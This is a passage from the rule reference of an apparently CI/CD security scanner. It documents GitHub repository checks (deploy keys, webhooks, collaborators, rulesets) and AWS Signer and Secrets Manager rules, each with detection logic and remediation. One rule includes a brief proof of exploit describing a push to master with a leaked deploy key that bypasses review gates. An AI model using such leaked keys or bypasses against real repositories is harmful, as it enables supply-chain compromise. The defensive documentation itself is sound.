- Long-running pattern of forgotten deploy keys retaining write access years after the original owner left an org. Public catalogs of leaked SSH private keys on paste sites and GitHub itself routinely hit configured deploy keys; the corresponding repo is push-compromised until the operator revokes the key.

**Proof of exploit.**

# Vulnerable: a write-enabled deploy key sits on the repo
# for years. The private half lived on a contractor's
# laptop and was checked into a public gist during a
# transient debug session.
GET /repos/acme/payments-api/keys
[
  {
    "id": 42,
    "title": "ci-runner-prod (added 2021-03)",
    "key": "ssh-ed25519 AAAA... ci-runner",
    "read_only": false,
    "created_at": "2021-03-04T10:00:00Z"
  }
]

# Attack: ``git push git@github.com:acme/payments-api.git``
# using the leaked private key writes directly to master,
# bypassing every required-review / CODEOWNERS / status-
# check gate the other SCM rules document. The push shows
# up in the audit log as ``key:42`` rather than a user
# account, so detection requires correlation across
# audit-log events most operators never review.

# Safe: revoke the deploy key. If write access is
# genuinely required for CI tagging, switch to a GitHub
# App with constrained scope plus a one-line audit-log
# entry per push.

**Source:** [`SCM-025`](../providers/scm.md#scm-025) in the [SCM provider](../providers/scm.md).

#### `SCM-026`: Webhook ships events insecurely (HTTP / no-TLS / no-secret) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-026 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed, [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** Reads ``GET /repos/{owner}/{repo}/hooks`` and flags any active webhook with one or more failure modes:

* ``config.url`` starts with ``http://`` — push payloads   including code diffs leak over plain HTTP
* ``config.insecure_ssl == "1"`` — TLS certificate   verification disabled, MITM possible on the HTTPS   endpoint
* ``config.secret`` is null / missing — no HMAC   signature, so anyone who learns the URL can forge   events into the receiver

Inactive webhooks (``active: false``) are skipped — they don't fire. Each finding's description lists every failure mode hit so the operator sees the full fix scope per webhook. Requires admin scope; without it the endpoint returns 403 / 404 and the rule passes silently. GitHub never returns the actual secret value via the API; the slot reports either ``"********"`` (configured) or ``null`` (missing), so this rule detects the absence without ever handling the credential itself.

**Recommendation.** For each flagged webhook, fix all three knobs at once (Settings → Webhooks → <hook> → Edit):

* Switch the Payload URL to ``https://`` and enable ``Verify SSL`` (the field is labeled ``SSL verification`` on the form; setting it to ``Enable SSL verification`` is the safe value).
* Set the ``Secret`` field to a long random value and validate the incoming ``X-Hub-Signature-256`` header on the receiving end. Without the secret + verification, an attacker who learns the URL (URLs are not secrets; they appear in receiving-system logs, in CI screenshots, in support tickets) can forge events.

If the receiving service genuinely cannot handle HTTPS or shared secrets, terminate TLS at a reverse proxy in front of the receiver and keep the public-facing URL ``https://`` with a real cert. The webhook content carries the full event payload — pull requests with diff content, push events with the commits, secret scanning alerts — which is exactly what an unauthenticated MITM is looking for.

**Known false positives.**

- Long-running internal-only webhooks pointing at a hostname only resolvable inside a private network (``http://internal.svc/hook``) often skip TLS by convention. The right fix is still to terminate TLS at an ingress and use a non-empty secret; the rule does not have visibility into network topology and cannot distinguish 'public HTTP' from 'private-network HTTP', so it errs toward flagging. Suppress per webhook id with a rationale that names the receiving service.

**Seen in the wild.**

- Long-running pattern of webhook payloads leaking via plain-HTTP receivers (Zapier, IFTTT, custom legacy endpoints) — the GitHub repo's commit-diff content, pull-request body, and secret-scanning alert payloads all land on the wire unencrypted. Public catalogs of compromised internal webhooks document the receiver-side breach where the URL alone was enough to inject forged events when no shared secret was configured.

**Source:** [`SCM-026`](../providers/scm.md#scm-026) in the [SCM provider](../providers/scm.md).

#### `SCM-027`: Outside collaborator holds write / maintain / admin access <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-027 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** Walks ``GET /repos/{owner}/{repo}/collaborators?affiliation=outside`` and flags every entry whose ``permissions`` block has any of ``admin: true``, ``maintain: true``, or ``push: true``. Read-only (``permissions.pull: true`` with no higher tier) and triage entries pass. Each finding's description names every elevated collaborator with the granular level so the operator can prioritize.

Requires admin scope on the repo to enumerate the outside-collaborator list; without it the endpoint returns 403 and the rule passes silently with an unavailability note. The hydrator fetches a single page (``per_page=100``); in the rare case of more than 100 outside collaborators on one repo, the description appends a truncation note and asks for a manual audit.

**Recommendation.** Audit Settings → Collaborators and teams → Outside collaborators. For each entry the rule flagged: either (a) downgrade the access to ``Read`` if the contributor only needs to clone / open PRs, or (b) move the account into the org as a member (so the org's centralized RBAC, SCIM, and access-review processes apply) before granting write access. Outside collaborators bypass the org's user-lifecycle controls: when the contractor's term ends, the entry stays until somebody manually removes it. A compromised outside-collab account with ``push`` access is the direct path to bypassing branch protection: that account can push code that SCM-021 (Actions self-approval) or SCM-018 (PR bypass allowance) clears through every required-review gate. Maintain / admin extends the blast radius to repo-config control.

**Known false positives.**

- Some flows legitimately grant write access to a vetted outside collaborator on a short-term basis (audit firm, incident responder, vendor escalation). The right compensating control is a calendar-bound suppression with the rationale and the expected revocation date; the rule itself should keep flagging the access so the revocation date is visible at every scan.

**Seen in the wild.**

- Long-running pattern across compromise postmortems: a former contributor's outside-collaborator entry retains ``push`` access years after the engagement ended. The account is then taken over (often by credential stuffing or a leaked PAT), and the attacker pushes a tampered commit that lands without review because the access level itself is the gate.

**Source:** [`SCM-027`](../providers/scm.md#scm-027) in the [SCM provider](../providers/scm.md).

#### `SCM-028`: Private repo allows forking <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-028 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** Reads ``private`` and ``allow_forking`` from the repo metadata. Fires when both are ``true``. Public repos (``private: false``) pass — forking a public repo is expected. Repos that explicitly disable forking (``allow_forking: false``) pass regardless of visibility. The fork-vs-Actions-secret-leak interaction is the operational risk: a fork PR using ``pull_request_target`` runs with the *base* repo's secrets, so a fork carries both the code and a path to the secrets if the workflow surface is permissive. Pairs with GHA-027 (``pull_request_target`` on untrusted input) and GHA-046 (manual PR-head fetches on untrusted triggers) at the workflow layer; SCM-028 is the org-policy gate.

**Recommendation.** In repo Settings → General → Features, uncheck ``Allow forking``. The setting only opens the trapdoor if you actually use ``pull_request_target`` or trigger workflows on fork PRs, but every private-repo fork carries the code into the forker's personal namespace (which has its own visibility surface — public profile, weaker 2FA enforcement, separate token scope). Even without the Actions-secret leak surface, allowing forks of a private repo means a compromised user account that had access at any point can preserve a copy of the intellectual property indefinitely.

If forks are genuinely needed for the development workflow, enforce ``Allow forking`` at the org level and pair it with GHA-046 (block manual PR-head fetches on untrusted-trigger workflows) and GHA-027 (no ``pull_request_target`` on untrusted input) so the secret-leak surface stays closed at the workflow layer.

**Known false positives.**

- Org-wide development workflows that require contributors to fork-and-PR within the company (rather than push to branches in the original repo) legitimately rely on ``allow_forking: true`` for private repos. The right compensating control is the workflow-side hardening: GHA-027 / GHA-046 / SCM-021 (Actions self-approval off) together keep the secret-leak surface closed even when forks are allowed. Suppress with a rationale that names the contribution workflow.

**Source:** [`SCM-028`](../providers/scm.md#scm-028) in the [SCM provider](../providers/scm.md).

#### `SCM-029`: Repository ruleset is in evaluate / disabled mode (not enforced) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-029 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied, [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Walks ``GET /repos/{owner}/{repo}/rulesets`` and flags every entry whose ``enforcement`` is anything other than ``"active"``. Two failure shapes are typical:

* ``enforcement: "evaluate"`` — preview / dry-run mode;   the ruleset logic runs but doesn't block.
* ``enforcement: "disabled"`` — explicit off; rule   exists in the UI but takes no effect.

Passes silently when no rulesets are configured (``[]``); in that case the SCM-001..010 legacy branch-protection rules carry the governance load. Requires admin scope on the repo; without it the endpoint returns 403 / 404 and the rule passes silently with an unavailability note.

**Recommendation.** Flip every non-enforcing ruleset to ``enforcement: active`` (Settings → Rules → Rulesets → <name> → Enforcement status → Active). The ``evaluate`` mode is intentionally permissive: it runs the rule logic and surfaces what *would* have been blocked, but it never actually blocks the push, merge, or commit. ``disabled`` is the explicit off-switch. Both modes silently document intent without enforcing the policy — operators commonly create rulesets in ``evaluate`` to preview their effect and forget to flip them, leaving the repo with the audit appearance of governance and the behavior of none.

Note: the legacy-branch-protection rules in this pack (SCM-001..010) do NOT see rulesets. An org that has fully migrated to rulesets can pass the entire SCM-NNN legacy pack while every actual governance signal is in evaluate mode.

**Known false positives.**

- A freshly-authored ruleset legitimately sits in ``evaluate`` mode for a short audit window before promotion to ``active``. Suppress for that specific ruleset id with a calendar-bound rationale; the rule should keep flagging until the promotion lands so the transition window doesn't quietly become permanent.

**Source:** [`SCM-029`](../providers/scm.md#scm-029) in the [SCM provider](../providers/scm.md).

#### `SCM-030`: Repository ruleset has bypass actor with bypass_mode: always <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-030 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed, [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** For each ``active`` ruleset, walks ``bypass_actors`` (populated by the per-ruleset detail fetch) and flags every entry with ``bypass_mode: "always"`` whose ``actor_type`` is not ``"Integration"`` (GitHub Apps). Non-app actors are listed by ``actor_type`` + ``actor_id``; the rule does not resolve those IDs to human-readable names (that would require another API round-trip per actor; the operator already sees the names in the UI when they go to fix it).

Rulesets in non-active enforcement modes are skipped — SCM-029 owns the not-enforced-at-all case and a non-active ruleset's bypass list is moot since the rules don't run anyway. Integration bypasses pass: a scoped GitHub App is a typical legitimate emergency-fix channel and shipping the bypass through the App's audit flow is the documented pattern. Requires admin scope; without it the ruleset-detail endpoint returns 403 / 404 and the rule passes silently.

**Recommendation.** For every bypass actor flagged, switch ``bypass_mode`` from ``always`` to ``pull_request`` in the ruleset configuration (Settings → Rules → <ruleset> → Bypass list → <actor> → Bypass mode). The ``pull_request`` mode requires the bypass to be requested via a PR review thread, which leaves an audit trail and gives reviewers a chance to push back. ``always`` mode is an unaudited override: the actor pushes / merges as if the ruleset weren't there, and no record names who or why. If the bypass is genuinely needed for emergency response, scope it to a specific GitHub App (the rule does not flag ``Integration`` bypasses by default) rather than a human role; an App is callable through your existing ticketing / approval flow.

**Known false positives.**

- Some orgs grant ``always`` bypass to a tightly-scoped automation team for after-hours emergency response. The right pattern is a GitHub App with auditable triggering (PagerDuty, Slack); ``always`` bypass for a human team leaves no record of the override. Suppress on the specific ruleset id with a calendar-bound rationale that names the audit channel and the next promotion review.

**Source:** [`SCM-030`](../providers/scm.md#scm-030) in the [SCM provider](../providers/scm.md).

#### `SCM-031`: Repo allows auto-merge (no human-timing gate) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-031 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Reads ``allow_auto_merge`` from the repo metadata (already fetched by every SCM scan; no extra endpoint). Fires when the value is ``true``. A missing field is treated as the GitHub default (``false``) and passes. The check is intentionally orthogonal to whether reviews are required — auto-merge with strong required-review controls is sometimes acceptable, auto-merge with weak ones is not. SCM-031 surfaces the trade-off; the operator pairs the finding with the SCM-002 / SCM-011 / SCM-014 / SCM-021 status to decide whether to keep auto-merge.

**Recommendation.** In repo Settings → General → Pull Requests, uncheck ``Allow auto-merge``. With auto-merge on, the PR merges the moment its required checks pass — including any required reviews already on the PR — with no further human gate on *when* the merge happens. The risk is compositional: combined with SCM-021 (Actions can self-approve PRs) or SCM-018 (PR-review bypass allowance), a workflow that opens a PR, satisfies its own required-review gate, and waits for status checks lands code into main without a human ever looking at the diff at the merge moment. If the workflow itself is what was compromised (Shai-Hulud, postinstall worm), the auto-merge step is the last gate that didn't fire.

If your team relies on auto-merge for throughput, the compensating controls are SCM-021 (Actions cannot self-approve), SCM-002 (required reviews ≥ 1), SCM-011 (CODEOWNERS reviews required), and SCM-014 (last-push approval) — all together. Without all four, auto-merge is the path of least resistance for an unauthored commit to reach main.

**Known false positives.**

- High-throughput engineering orgs that pair auto-merge with rigorous required-reviews + CODEOWNERS + last-push approval + no-Actions-self-approval (SCM-021) legitimately depend on auto-merge for velocity. The right pattern is to suppress this rule with a rationale that names the compensating controls so the trade-off stays visible at every audit. Suppressing without naming the controls makes the trade-off invisible to the next reviewer.

**Source:** [`SCM-031`](../providers/scm.md#scm-031) in the [SCM provider](../providers/scm.md).

#### `SCM-032`: Active ruleset doesn't require a PR review (governance theater) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-032 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** For every active ruleset (``enforcement: "active"``) with an evaluable detail body, walks the ``rules`` array looking for an entry with ``type: "pull_request"`` whose ``parameters.required_approving_review_count`` is at least 1. Fires when none is found. Non-active rulesets are SCM-029's surface; rulesets with unavailable detail are surfaced with an evaluation-gap note (the same pattern SCM-030 uses).

Pairs with SCM-002 (legacy branch-protection required reviews) and SCM-029 (ruleset not enforced). The three rules together cover the required-review surface: SCM-002 for legacy BP, SCM-029 for the existence of an active ruleset, SCM-032 for whether that ruleset actually requires a PR.

**Recommendation.** Add a ``pull_request`` rule to every active ruleset and set ``parameters.required_approving_review_count`` to at least 1 (Settings → Rules → <ruleset> → Add rule → Require a pull request before merging → Required approvals). An active ruleset without a PR-review gate is the same shape as legacy branch protection without required reviews (SCM-002): the ruleset is enforced — force-push denial, signed commits, status checks may all fire — but pushes / merges still go through without human review. Operators commonly create rulesets for specific governance signals (e.g., commit-message patterns for compliance) and forget that the PR-review gate is a separate rule type that has to be added explicitly.

SCM-032 evaluates rulesets in isolation: it does not consult legacy branch-protection state, so it fires on any active ruleset that lacks a PR-review rule, even when legacy branch protection on the same ref provides the required-review gate. SCM-002 covers the legacy branch-protection side; the two rules together describe the full review-control surface.

**Known false positives.**

- Some rulesets are deliberately scoped to enforce only non-PR-review controls (e.g., a ``commit_message_pattern`` ruleset for changelog compliance, or a ``tag_name_pattern`` ruleset for release tagging). The right pattern is to ALSO have a separate ruleset that enforces PR reviews on the same refs; SCM-032 fires when the *combination* leaves a gap. Suppress on the specific ruleset id with a rationale that names the PR-review channel (separate ruleset or legacy branch protection).

**Source:** [`SCM-032`](../providers/scm.md#scm-032) in the [SCM provider](../providers/scm.md).

#### `SCM-033`: Active ruleset doesn't require status checks <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-033 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "required_status_checks"`` whose ``parameters.required_status_checks`` lists at least one context. Empty lists are treated as no rule. Non-active rulesets are SCM-029's surface; rulesets with unavailable detail are surfaced explicitly. Passes silently when no rulesets are configured (legacy branch-protection SCM-008 covers the gap).

**Recommendation.** Add a ``required_status_checks`` rule to every active ruleset and populate ``parameters.required_status_checks`` with the names of the contexts that must pass (Settings → Rules → <ruleset> → Add rule → Require status checks to pass before merging → pick the specific check runs). Without it, the ruleset is enforced but pushes / merges land without any of your tests, lint, security scans, or build verification actually being green — the ruleset documents that checks *exist* without requiring them to *pass*. The ruleset analog of SCM-008 (legacy branch-protection required checks).

An empty contexts list (``required_status_checks: []``) is the same as no rule — it documents the gate without filling it. Pick at least one canonical job name (the primary build) and add the rest of your CI matrix over time.

**Known false positives.**

- Some rulesets are deliberately scoped to non-CI concerns (commit-message format, tag-name pattern); those should be paired with a separate ruleset that enforces status checks on the same refs. Suppress with a rationale that names the parallel ruleset.

**Source:** [`SCM-033`](../providers/scm.md#scm-033) in the [SCM provider](../providers/scm.md).

#### `SCM-034`: Active ruleset doesn't block force-push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-034 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "non_fast_forward"``. Presence of the rule means force-pushes are blocked on the refs the ruleset targets. Passes silently when no rulesets are configured (legacy SCM-007 covers the gap).

**Recommendation.** Add a ``non_fast_forward`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Block force pushes). Without it, a force-push rewrites history on the target branch — commits that previously appeared in the audit trail disappear from the surface log, and anyone with push access can erase evidence of an earlier action. The ruleset analog of SCM-007 (legacy branch-protection force-push denial). Pair with SCM-006 (signed commits) so even a rewrite leaves verifiable signatures on the surviving commits.

**Known false positives.**

- Release-engineering rulesets sometimes deliberately allow force-push on a specific tag-pattern target (e.g. moving release tags). Suppress on the specific ruleset id with a rationale that names the target pattern.

**Source:** [`SCM-034`](../providers/scm.md#scm-034) in the [SCM provider](../providers/scm.md).

#### `SCM-035`: Active ruleset doesn't block branch deletion <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-035 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "deletion"``. Presence of the rule means deletion is blocked. Passes silently when no rulesets are configured (legacy SCM-009 covers the gap).

**Recommendation.** Add a ``deletion`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Restrict deletions). Without it, anyone with push access to a ref the ruleset targets can delete that ref. The ruleset analog of SCM-009 (legacy branch-protection branch deletion denial). Mostly a hygiene control — deleted commits are recoverable from the reflog until garbage collection — but loss of the default-branch ref is a real operational disruption.

**Known false positives.**

- Rulesets that target ephemeral preview / feature branches legitimately allow deletion. Suppress on the specific ruleset id with a rationale that names the target pattern.

**Source:** [`SCM-035`](../providers/scm.md#scm-035) in the [SCM provider](../providers/scm.md).

#### `SCM-036`: Active ruleset doesn't require signed commits <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-036 }

**Evidences:** [`PR.AA-03`](#ctrl-pr-aa-03) Users, services, and hardware are authenticated, [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "required_signatures"``. Presence means commits to the targeted refs must carry a valid signature. Passes silently when no rulesets are configured (legacy SCM-006 covers the gap).

**Recommendation.** Add a ``required_signatures`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Require signed commits). Without it, a compromised contributor account (or a stolen PAT) can push commits that appear to originate from any author the attacker names in the commit metadata. The signature requirement ties each commit to a key the contributor controls (SSH / GPG / sigstore via gitsign), so post-incident the audit log shows which commits were signed by the key vs forged. The ruleset analog of SCM-006 (legacy branch-protection signed-commit enforcement).

**Known false positives.**

- Teams that haven't yet rolled out signing keys for all contributors sometimes ship without signature enforcement to avoid blocking ordinary PRs. The right pattern is a phased rollout (configure the rule in ``evaluate`` mode first, then flip to ``active`` once contributors have their keys). Suppress with a rationale that names the rollout date.

**Source:** [`SCM-036`](../providers/scm.md#scm-036) in the [SCM provider](../providers/scm.md).

#### `SCM-037`: Active ruleset's pull_request rule doesn't dismiss stale reviews <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-037 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** For every active ruleset with a ``pull_request`` rule, checks ``parameters.dismiss_stale_reviews_on_push`` is ``true``. Skips rulesets that don't have a ``pull_request`` rule at all — SCM-032 owns that surface. Passes silently when no rulesets are configured (legacy SCM-012 covers the gap).

**Recommendation.** On every active ruleset's ``pull_request`` rule, set ``parameters.dismiss_stale_reviews_on_push: true`` (Settings → Rules → <ruleset> → Require a pull request before merging → Dismiss stale pull request approvals when new commits are pushed). Without it, an attacker can land an approving review on a benign early version of the PR, then force-push (if not blocked by SCM-034) or otherwise update the head with malicious commits, and the original approval still counts toward the required-review gate.

The ruleset analog of SCM-012 (legacy branch-protection stale-review dismissal). Pair with SCM-032 (PR-review presence) — without dismissal, the review-count gate documents intent rather than reality once the PR has diverged from the approved state.

**Known false positives.**

- Some workflows use ephemeral review-bot accounts that auto-re-approve after push; dismissing on push then re-issuing the approval is the documented pattern. The rule still fires (the dismissal happens) and the re-approval lands separately. If your team operates a different review-velocity flow, suppress with a rationale that names the re-approval channel.

**Source:** [`SCM-037`](../providers/scm.md#scm-037) in the [SCM provider](../providers/scm.md).

#### `SCM-038`: Active ruleset doesn't require linear history <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-038 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "required_linear_history"``. Presence means merge commits to the targeted refs are rejected (only fast-forward / rebase / squash integration is allowed). Passes silently when no rulesets are configured — linear history has no legacy branch-protection analog, so absence of rulesets means the gate simply doesn't exist (not that it's enforced elsewhere).

**Recommendation.** Add a ``required_linear_history`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Require linear history). Without it, merges into the targeted refs can introduce merge commits, which produce a branching history where two ancestors share authorship of the merge result. Linear history forces rebase- or squash-style integration so every commit on the trunk has a single parent and a single attributable author. This pairs with SCM-036 (signed commits) to give post-incident forensics a clean answer to *who wrote this code and when*: each commit on main has one signature, one author, one parent, one timestamp.

Merge commits aren't a direct attacker primitive — force-push (SCM-034) is the history-rewrite surface — but they obscure git-bisect and complicate ``git log --first-parent`` triage during an incident, and they hide which specific commits landed when a long-lived feature branch is merged.

**Known false positives.**

- Teams that prefer merge commits as a deliberate policy (e.g. to preserve the shape of long-lived feature branches in the history) legitimately ship without this rule. Suppress with a rationale that names the merge-strategy policy. The rule is a hygiene / auditability control, not a hard security gate.

**Source:** [`SCM-038`](../providers/scm.md#scm-038) in the [SCM provider](../providers/scm.md).

#### `SCM-039`: Active ruleset doesn't pin a required workflow <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-039 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented, [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "workflows"`` whose ``parameters.workflows`` is a non-empty list. An empty workflows list is treated as no rule (it documents the gate without filling it). Passes silently when no rulesets are configured — required workflows have no legacy branch-protection analog, so absence of rulesets means the gate simply doesn't exist (not that it's enforced elsewhere).

**Recommendation.** Add a ``workflows`` rule to the ruleset (Settings → Rules → <ruleset> → Add rule → Require workflows to pass before merging) and pin at least one workflow by repository + path + ref. The ``workflows`` ruleset rule differs from ``required_status_checks`` (SCM-033) in a load-bearing way: status checks gate on a context *name* that the workflow chooses to report — if the PR edits the workflow YAML to remove or rename that context, the check vanishes and the gate documents intent rather than reality. The ``workflows`` rule pins the workflow file at a vetted ref (``main`` or a specific SHA) and forces *that* workflow to run against the PR's code regardless of what the PR did to the workflow YAML in its own branch. Closes the scan-removal supply-chain shape (attacker opens a PR that deletes ``.github/workflows/security-scan.yml`` and submits malicious code in the same PR).

Pin the workflow ref to either a long-lived branch the ruleset bypass actors don't have write access to or a specific SHA. A ref pinned to a branch the PR author controls undoes the protection.

**Known false positives.**

- Repos that don't run any workflow-based gating at all (pure code-review + signed-commits posture) legitimately ship without this rule. Suppress with a rationale that names the compensating controls. The rule fires LOW because most teams' security posture comes from status-checks (SCM-033); the workflows rule is the stricter scan-removal-resistant variant.

**Source:** [`SCM-039`](../providers/scm.md#scm-039) in the [SCM provider](../providers/scm.md).

#### `SCM-040`: Active ruleset doesn't gate on code scanning results <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-040 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC, [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "code_scanning"`` whose ``parameters.code_scanning_tools`` lists at least one tool. An empty tools list documents the gate without filling it and is treated as no rule. Passes silently when no rulesets are configured — the rule_type is ruleset-only and has no legacy branch-protection analog, so absence of rulesets means the gate simply doesn't exist (not that it's enforced elsewhere).

**Recommendation.** Add a ``code_scanning`` rule to the ruleset (Settings → Rules → <ruleset> → Add rule → Require code scanning results) and pin at least one tool (CodeQL, the most common choice) with a non-empty alerts threshold. The rule turns a passive code-scanning configuration (SCM-003 — default setup is on) into an active merge gate: the PR can't merge until the scan completes for the head SHA *and* the configured threshold isn't crossed (e.g. ``security_alerts_threshold: "high_or_higher"`` rejects merges that introduce high-severity findings). Closes the asymmetry between code scanning being enabled and the org actually blocking on its results.

If your org doesn't license GHAS (the underlying feature), this rule type isn't available. Suppress with a rationale that names the licensing constraint and carry the gate via ``required_status_checks`` (SCM-033) pointed at the named context the scan tool reports.

**Known false positives.**

- GHAS-licensing constraint: the ``code_scanning`` ruleset rule type requires GitHub Advanced Security on the repo. Repos on free / team tier can't configure this rule even when they run code scanning via third-party tools. Suppress with the licensing rationale and ensure SCM-033 carries the merge gate via the scan tool's reported status-check context.

**Source:** [`SCM-040`](../providers/scm.md#scm-040) in the [SCM provider](../providers/scm.md).

#### `SCM-041`: Active ruleset doesn't gate on a deployment environment <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-041 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied, [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "required_deployments"`` whose ``parameters.required_deployment_environments`` lists at least one environment. Empty lists are treated as no rule. Passes silently when no rulesets are configured — required-deployments enforcement has no legacy branch-protection analog in this scanner's coverage and is not separately evaluated.

**Recommendation.** Add a ``required_deployments`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Require deployments to succeed before merging) and pin at least one environment (typically the staging environment that a CI pipeline deploys the PR's commit to). Pairs with SCM-023 (env reviewers) and SCM-024 (env branch policy): SCM-023/024 ensure the environment itself is gated; SCM-041 makes a successful deployment to that environment a merge prerequisite. Without it, a PR can merge into the default branch without a smoke-test deployment having run, even when the environment is rigorously configured. The ruleset analog of legacy branch protection's ``required_deployments`` checkbox.

An empty environments list (``required_deployment_environments: []``) documents the gate without filling it and is treated as no rule. Pick at least one environment name (typically ``staging`` or ``preview``) so the rule actually gates.

**Known false positives.**

- Repos that don't have GitHub deployment environments configured (or that gate via status-checks SCM-033 pointed at a deploy job's reported context) legitimately ship without this rule. Suppress with a rationale that names the compensating control. The rule fires LOW because most teams' deployment gating comes from the environment configuration itself (SCM-023, SCM-024); SCM-041 is the merge-side complement that closes the gap when an environment exists but isn't named in any ruleset.

**Source:** [`SCM-041`](../providers/scm.md#scm-041) in the [SCM provider](../providers/scm.md).

#### `SIGN-001`: No AWS Signer profile defined for Lambda deploys <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-sign-001 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** AWS Signer profiles are the upstream of LMB-001's code-signing config. Without a profile defined, no function in the account can enforce code-signing, LMB-001's recommendation has nothing to point at. The profile is the foundation; the per-function code-signing config attaches it.

**Recommendation.** Create an AWS Signer profile with platform ``AWSLambda-SHA384-ECDSA`` and reference it from every Lambda code-signing config used by the pipeline. Without a profile, LMB-001 remediation isn't possible and release artifacts can't be signed at build time.

**Source:** [`SIGN-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `SIGN-002`: AWS Signer profile is revoked or inactive <span class="pg-sev pg-sev--high">HIGH</span> { #detail-sign-002 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** A revoked or canceled Signer profile invalidates every signature it ever produced. Lambda functions configured to enforce code-signing fail to deploy until the profile is replaced (or, if ``UntrustedArtifactOnDeployment = Warn``, deploy with a CloudWatch warning the operator rarely reads).

**Recommendation.** Rotate the signing profile: create a replacement and update every code-signing config that references the revoked profile. A revoked or canceled profile invalidates every signature it produced, lambdas relying on it will fail verification.

**Source:** [`SIGN-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `SM-001`: Secrets Manager secret has no rotation configured <span class="pg-sev pg-sev--high">HIGH</span> { #detail-sm-001 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Only secrets actually referenced by CodeBuild are checked, secrets used purely by application workloads are out of scope for a CI/CD scanner.

**Recommendation.** Enable automatic rotation on every Secrets Manager secret referenced by a CodeBuild project or CodePipeline. Unrotated secrets persist indefinitely, so a single leak (e.g. a build log that echoed the value) compromises the secret for its full lifetime.

**Source:** [`SM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `SM-002`: Secrets Manager resource policy allows wildcard principal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-sm-002 }

